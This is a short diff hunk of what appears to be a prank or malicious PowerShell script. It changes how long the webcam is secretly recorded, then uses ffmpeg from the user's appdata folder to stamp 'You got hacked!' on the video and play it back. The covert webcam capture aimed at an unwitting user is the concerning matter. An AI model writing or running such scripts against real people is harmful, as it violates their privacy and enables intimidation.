@@ -112,7 +112,7 @@ function Start-WebcamRecorder
     Write-Verbose "[!] Unable to obtain any audio or video input filters"    
   }
 }
-Start-WebcamRecorder -RecordTime 3
+Start-WebcamRecorder -RecordTime 1
 & $env:appdata/ffmpeg.exe -y -i "$env:appdata/out.avi" -vf "drawtext=text='You got hacked!':x=10:y=H-th-10:fontsize=100:fontcolor=white:shadowcolor=black:shadowx=5:shadowy=5" "$env:appdata/out2.avi"
 start $env:appdata/out2.avi
 exit
